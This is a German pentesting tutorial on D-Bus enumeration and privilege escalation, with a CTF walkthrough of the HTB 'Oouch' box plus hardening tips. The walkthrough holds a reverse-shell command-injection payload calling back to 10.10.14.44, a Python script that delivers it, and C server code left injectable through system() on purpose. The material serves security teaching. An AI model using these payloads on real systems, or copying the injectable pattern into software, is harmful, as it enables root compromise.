# D-Bus-Aufzählung und Privilege Escalation durch Command Injection

{{#include ../../banners/hacktricks-training.md}}

## **GUI-Aufzählung**

D-Bus wird in Ubuntu-Desktop-Umgebungen als Vermittler für die Interprozesskommunikation (IPC) eingesetzt. Unter Ubuntu ist der gleichzeitige Betrieb mehrerer Message-Busse zu beobachten: der System-Bus, der hauptsächlich von **privileged services genutzt wird, um systemweit relevante Services bereitzustellen**, sowie für jeden angemeldeten Benutzer ein Session-Bus, der nur für diesen Benutzer relevante Services bereitstellt. Der Fokus liegt hier hauptsächlich auf dem System-Bus, da dieser mit Services verbunden ist, die mit höheren Privilegien (z. B. root) ausgeführt werden, während unser Ziel die Privilege Escalation ist. Es ist anzumerken, dass die Architektur von D-Bus einen „router“ pro Session-Bus verwendet, der dafür verantwortlich ist, Client-Nachrichten anhand der von den Clients für den gewünschten Service angegebenen Adresse an die entsprechenden Services weiterzuleiten.<sup>[[1]](#references)</sup>

Services auf D-Bus werden durch die **objects** und **interfaces** definiert, die sie bereitstellen. Objects können mit Klasseninstanzen in standardmäßigen OOP-Sprachen verglichen werden, wobei jede Instanz durch einen **object path** eindeutig identifiziert wird. Dieser Pfad, der einem Dateisystempfad ähnelt, identifiziert jedes vom Service bereitgestellte Object eindeutig. Ein für die Untersuchung wichtiges Interface ist das **org.freedesktop.DBus.Introspectable**-Interface, das eine einzige Methode namens Introspect enthält. Diese Methode gibt eine XML-Darstellung der vom Object unterstützten Methoden, Signale und Eigenschaften zurück; hier liegt der Fokus auf den Methoden, während Eigenschaften und Signale ausgelassen werden.

Für die Kommunikation mit dem D-Bus-Interface wurden zwei Tools eingesetzt: ein CLI-Tool namens **gdbus** zur einfachen Aufrufung der von D-Bus bereitgestellten Methoden in Scripts sowie [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ein Python-basiertes GUI-Tool, das dafür entwickelt wurde, die auf jedem Bus verfügbaren Services aufzuzählen und die in jedem Service enthaltenen Objects anzuzeigen.
```bash
sudo apt-get install d-feet
```
Wenn du den **session bus** überprüfst, bestätige zuerst die aktuelle Adresse:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Im ersten Bild werden die beim D-Bus-Systembus registrierten Services angezeigt, wobei **org.debin.apt** nach Auswahl der Schaltfläche „System Bus“ hervorgehoben ist. D-Feet fragt diesen Service nach Objekten ab und zeigt für die ausgewählten Objekte Interfaces, Methoden, Eigenschaften und Signale an, wie im zweiten Bild zu sehen ist. Die Signatur jeder Methode wird ebenfalls detailliert angezeigt.

Ein bemerkenswertes Feature ist die Anzeige der **Prozess-ID (pid)** und der **Kommandozeile** des Services. Dies ist nützlich, um zu überprüfen, ob der Service mit erhöhten Privilegien ausgeführt wird, was für die Relevanz der Recherche wichtig ist.

**D-Feet ermöglicht auch die Invocation von Methoden**: Benutzer können Python-Ausdrücke als Parameter eingeben, die D-Feet vor der Übergabe an den Service in D-Bus-Typen umwandelt.

Beachtet jedoch, dass **einige Methoden eine Authentication erfordern**, bevor wir sie aufrufen dürfen. Wir ignorieren diese Methoden, da unser Ziel von vornherein darin besteht, unsere Privilegien ohne Credentials zu erhöhen.

Beachtet außerdem, dass einige Services einen anderen D-Bus-Service namens org.freedeskto.PolicyKit1 abfragen, um festzustellen, ob ein Benutzer bestimmte Aktionen ausführen darf oder nicht.

## **Cmd line Enumeration**

### Service-Objekte auflisten

Es ist möglich, geöffnete D-Bus-Interfaces mit folgenden Befehlen aufzulisten:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Dienste mit der Kennzeichnung **`(activatable)`** sind besonders interessant, weil sie **noch nicht ausgeführt werden**, aber eine Bus-Anfrage sie bei Bedarf starten kann. Beschränke dich nicht auf `busctl list`; ordne diese Namen den tatsächlichen Binaries zu, die sie ausführen würden.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Das zeigt dir schnell, welcher `Exec=`-Pfad für einen aktivierbaren Namen gestartet wird und unter welcher Identität. Wenn das Binary oder seine Ausführungskette nur unzureichend geschützt ist, kann ein inaktiver Service trotzdem als Pfad zur Privilege Escalation dienen.

#### Verbindungen

[Aus Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wenn ein Prozess eine Verbindung zu einem Bus herstellt, weist der Bus der Verbindung einen speziellen Busnamen zu, der _unique connection name_ genannt wird. Busnamen dieses Typs sind unveränderlich – es ist garantiert, dass sie sich nicht ändern, solange die Verbindung besteht – und, was noch wichtiger ist, sie können während der Lebensdauer des Busses nicht wiederverwendet werden. Das bedeutet, dass keine andere Verbindung zu diesem Bus jemals denselben _unique connection name_ zugewiesen bekommt, selbst wenn derselbe Prozess die Verbindung zum Bus beendet und eine neue erstellt. _Unique connection names_ sind leicht erkennbar, da sie mit dem ansonsten verbotenen Doppelpunktzeichen beginnen.<sup>[[4]](#references)</sup>

### Informationen zum Service-Objekt

Anschließend kannst du mit folgendem Befehl einige Informationen über das Interface abrufen:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Ordne den Busnamen außerdem seiner `systemd`-Unit und dem Pfad zur ausführbaren Datei zu:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Diese Frage beantwortet die während der privesc entscheidende operative Frage: **Wenn ein Methodenaufruf erfolgreich ist, welche echte Binary und welche Unit führen die Aktion aus?**

### Schnittstellen eines Service-Objekts auflisten

Du benötigst ausreichende Berechtigungen.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect-Schnittstelle eines Service-Objekts

Beachte, dass in diesem Beispiel die zuletzt ermittelte Schnittstelle mithilfe des Parameters `tree` ausgewählt wurde (_siehe vorherigen Abschnitt_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Beachten Sie die Methode `.Block` des Interfaces `htb.oouch.Block` (diejenige, für die wir uns interessieren). Das „s“ der anderen Spalten könnte bedeuten, dass ein String erwartet wird.

Bevor Sie etwas Gefährliches versuchen, validieren Sie zunächst eine **read-oriented** oder anderweitig risikoarme Methode. Dadurch lassen sich drei Fälle klar unterscheiden: falsche Syntax, erreichbar, aber verweigert, oder erreichbar und erlaubt.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods mit Policies und Actions korrelieren

Introspection zeigt dir, **was** du aufrufen kannst, sagt dir aber nicht, **warum** ein Aufruf erlaubt oder verweigert wird. Für echtes privesc triage musst du normalerweise **drei Ebenen gemeinsam** untersuchen:

1. **Activation metadata** (`.service` files oder `SystemdService=`), um herauszufinden, welche Binary und welche Unit tatsächlich ausgeführt werden.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), um herauszufinden, wer `own`, `send_destination` oder `receive_sender` darf.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`), um das standardmäßige Authorization-Modell zu verstehen (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Nützliche Befehle:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Gehe **nicht** von einer 1:1-Zuordnung zwischen einer D-Bus-Methode und einer Polkit-Aktion aus. Dieselbe Methode kann abhängig vom zu ändernden Objekt oder vom Laufzeitkontext eine andere Aktion auswählen. Daher sieht der praktische Workflow folgendermaßen aus:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` und die relevanten `.policy`-Dateien mit grep durchsuchen
3. risikoarme Live-Probes mit `busctl call`, `gdbus call` oder `dbusmap --enable-probes --null-agent`

Proxy- oder Kompatibilitätsdienste verdienen besondere Aufmerksamkeit. Ein **als root ausgeführter Proxy**, der Anfragen über seine eigene, zuvor aufgebaute Verbindung an einen anderen D-Bus-Dienst weiterleitet, kann dazu führen, dass das Backend jede Anfrage als von UID 0 stammend behandelt, sofern die Identität des ursprünglichen Aufrufers nicht erneut validiert wird.<sup>[[3]](#references)</sup>

### Monitor-/Capture-Schnittstelle

Mit ausreichenden Berechtigungen (nur `send_destination`- und `receive_sender`-Berechtigungen reichen nicht aus) kannst du eine **D-Bus-Kommunikation überwachen**.

Um eine **Kommunikation zu überwachen**, musst du **root** sein. Wenn du auch als root weiterhin Probleme feststellst, prüfe [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) und [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Wenn du weißt, wie man eine D-Bus-Konfigurationsdatei so konfiguriert, dass **nicht als root ausgeführte Benutzer die Kommunikation sniffen können**, **kontaktiere mich bitte**!

Verschiedene Möglichkeiten zur Überwachung:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Im folgenden Beispiel wird die Schnittstelle `htb.oouch.Block` überwacht und **die Nachricht "**_**lalalalal**_**" wird aufgrund einer Fehlkommunikation gesendet**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Du kannst `capture` anstelle von `monitor` verwenden, um die Ergebnisse in einer **pcapng**-Datei zu speichern, die Wireshark öffnen kann:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Das gesamte Rauschen filtern <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Wenn sich auf dem Bus einfach zu viele Informationen befinden, übergib eine match rule wie folgt:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Es können mehrere Regeln angegeben werden. Wenn eine Nachricht auf _eine_ der Regeln zutrifft, wird die Nachricht ausgegeben. Zum Beispiel:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Weitere Informationen zur Syntax von Match-Regeln finden Sie in der [D-Bus-Dokumentation](http://dbus.freedesktop.org/doc/dbus-specification.html).<sup>[[7]](#references)</sup>

### Mehr

`busctl` bietet noch weitere Optionen. [**Hier finden Sie alle**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Verwundbares Szenario**

Als Benutzer **qtc innerhalb des Hosts "oouch" von HTB** finden Sie eine **unerwartete D-Bus-Konfigurationsdatei** unter _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Aus der vorherigen Konfiguration geht hervor, dass **du der Benutzer `root` oder `www-data` sein musst, um Informationen** über diese D-BUS-Kommunikation zu senden und zu empfangen.

Als Benutzer **qtc** innerhalb des Docker-Containers `aeb4525789d8` findest du in der Datei _/code/oouch/routes.py_ Code im Zusammenhang mit dbus. Dies ist der interessante Code:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Wie Sie sehen können, **stellt es eine Verbindung zu einer D-Bus-Schnittstelle her** und sendet die „client_ip“ an die **„Block“-Funktion**.

Auf der anderen Seite der D-Bus-Verbindung läuft eine C-kompilierte Binärdatei. Dieser Code **lauscht** auf der D-Bus-Verbindung **auf eine IP-Adresse und ruft iptables über die `system`-Funktion auf**, um die angegebene IP-Adresse zu blockieren.\
**Der Aufruf von `system` ist absichtlich anfällig für command injection**, daher erstellt ein Payload wie der folgende eine reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Am Ende dieser Seite finden Sie den **vollständigen C-Code der D-Bus-Anwendung**. Darin finden Sie zwischen den Zeilen 91–97, **wie der `D-Bus object path`** **und der `interface name`** **registriert werden**. Diese Informationen werden benötigt, um Informationen an die D-Bus-Verbindung zu senden:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Außerdem kannst du in Zeile 57 feststellen, dass **die einzige für diese D-Bus-Kommunikation registrierte Methode** `Block` heißt(_**deshalb werden die Payloads im folgenden Abschnitt an das Service-Objekt `htb.oouch.Block`, das Interface `/htb/oouch/Block` und den Methodennamen `Block` gesendet**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Der folgende Python-Code sendet den Payload über `block_iface.Block(runme)` an die `Block`-Methode der D-Bus-Verbindung (_beachte, dass er aus dem vorherigen Codeabschnitt extrahiert wurde_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl und dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` ist ein Tool zum Senden von Nachrichten an den „Message Bus“.
- Message Bus – Eine von Systemen verwendete Software, um die Kommunikation zwischen Anwendungen zu erleichtern. Sie steht im Zusammenhang mit Message Queue (Nachrichten werden in einer Sequenz geordnet), aber in einem Message Bus werden die Nachrichten in einem subscription model und außerdem sehr schnell gesendet.
- Das Tag „-system“ wird verwendet, um anzugeben, dass es sich um eine Systemnachricht und standardmäßig nicht um eine session message handelt.
- Das Tag „–print-reply“ wird verwendet, um unsere Nachricht ordnungsgemäß auszugeben und Antworten in einem für Menschen lesbaren Format zu empfangen.
- „–dest=Dbus-Interface-Block“ ist die Adresse des Dbus-Interfaces.
- „–string:“ – Der Typ der Nachricht, die wir an das Interface senden möchten. Es gibt mehrere Formate zum Senden von Nachrichten, z. B. double, bytes, booleans, int und objpath. Davon ist der „object path“ nützlich, wenn wir einen Dateipfad an das Dbus-Interface senden möchten. In diesem Fall können wir eine spezielle Datei (FIFO) verwenden, um einen Befehl im Namen einer Datei an das Interface zu übergeben. „string:;“ – Damit wird der object path erneut aufgerufen, an dem wir die FIFO reverse shell file/command platzieren.

_Beachte, dass in `htb.oouch.Block.Block` der erste Teil (`htb.oouch.Block`) auf das service object und der letzte Teil (`.Block`) auf den method name verweist._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automatisierte Enumeration-Hilfsprogramme (2023-2025)

Die manuelle Enumeration einer großen D-Bus-Angriffsfläche mit `busctl`/`gdbus` wird schnell mühsam. Zwei kleine FOSS-Werkzeuge, die in den letzten Jahren veröffentlicht wurden, können während red-team- oder CTF-Einsätzen den Vorgang beschleunigen:

### dbusmap ("Nmap for D-Bus")
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* In C geschrieben; einzelnes statisches Binary (<50 kB), das jeden Objektpfad durchläuft, die `Introspect`-XML abruft und sie der zuständigen PID/UID zuordnet.<sup>[[5]](#references)</sup>
* Nützliche Flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Das Tool markiert ungeschützte Well-known Names mit `!` und zeigt dadurch sofort Dienste, die man *übernehmen* kann, oder von einer unprivilegierten Shell erreichbare Methodenaufrufe.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Python-only-Script, das nach *beschreibbaren* Pfaden in systemd-Units **und** nach zu permissiven D-Bus-Policy-Dateien sucht (z. B. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Schnelle Verwendung:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Das D-Bus-Modul durchsucht die folgenden Verzeichnisse und hebt jeden Dienst hervor, der von einem normalen Benutzer gefälscht oder übernommen werden kann:
* `/etc/dbus-1/system.d/` und `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (Vendor-Overrides)

---

## Bemerkenswerte D-Bus-Privilege-Escalation-Bugs (2024-2025)

Ein Blick auf kürzlich veröffentlichte CVEs hilft dabei, ähnliche unsichere Muster in Custom-Code zu erkennen. Zwei gute aktuelle Beispiele sind:<sup>[[2]](#references)[[3]](#references)</sup>

| Jahr | CVE | Komponente | Grundursache | Offensive Erkenntnis |
|------|-----|------------|--------------|----------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Der als root laufende Dienst stellte eine D-Bus-Schnittstelle bereit, die unprivilegierte Benutzer neu konfigurieren konnten, einschließlich des Ladens von durch Angreifer kontrolliertem Macro-Verhalten. | Wenn ein Daemon **Geräte-/Profil-/Konfigurationsverwaltung** auf dem Systembus bereitstellt, sollten beschreibbare Konfigurationen und Macro-Funktionen als Primitive zur Codeausführung behandelt werden, nicht nur als „Einstellungen“. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Ein als root laufender Kompatibilitäts-Proxy leitete Anfragen an Backend-Dienste weiter, ohne den ursprünglichen Security Context des Aufrufers beizubehalten, sodass die Backends dem Proxy als UID 0 vertrauten. | **Proxy-/Bridge-/Kompatibilitäts**-D-Bus-Dienste als eigene Bug-Klasse behandeln: Wenn sie privilegierte Aufrufe weiterleiten, prüfen, wie die UID/der Polkit-Kontext des Aufrufers das Backend erreicht. |

Zu beachtende Muster:
1. Der Dienst läuft **als root auf dem Systembus**.
2. Entweder gibt es **keine Autorisierungsprüfung**, oder die Prüfung erfolgt für das **falsche Subjekt**.
3. Die erreichbare Methode verändert schließlich den Systemzustand: Paketinstallation, Benutzer-/Gruppenänderungen, Bootloader-Konfiguration, Aktualisierung von Geräteprofilen, Dateischreibvorgänge oder direkte Befehlsausführung.

`dbusmap --enable-probes` oder einen manuellen `busctl call` verwenden, um zu bestätigen, ob eine Methode erreichbar ist. Anschließend die Policy-XML des Dienstes und die Polkit-Aktionen untersuchen, um zu verstehen, **welches Subjekt** tatsächlich autorisiert wird.

---

## Schnelle Maßnahmen zur Härtung und Erkennung

* Nach für alle beschreibbaren oder für *send/receive* offenen Policies suchen:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Für gefährliche Methoden Polkit voraussetzen – auch *root*-Proxies sollten die PID des *Aufrufers* an `polkit_authority_check_authorization_sync()` übergeben, statt ihre eigene.
* Bei langlebigen Hilfsprogrammen Privilegien abgeben (`sd_pid_get_owner_uid()` verwenden, um Namespaces nach der Verbindung mit dem Bus zu wechseln).
* Wenn ein Dienst nicht entfernt werden kann, ihn zumindest auf eine dedizierte Unix-Gruppe *beschränken* und den Zugriff in seiner XML-Policy einschränken.
* Blue-team: Den Systembus mit `busctl capture > /var/log/dbus_$(date +%F).pcapng` aufzeichnen und zur Anomalieerkennung in Wireshark importieren.

---

## References

- [1] [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service allows configuration by any unprivileged user](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)

{{#include ../../banners/hacktricks-training.md}}
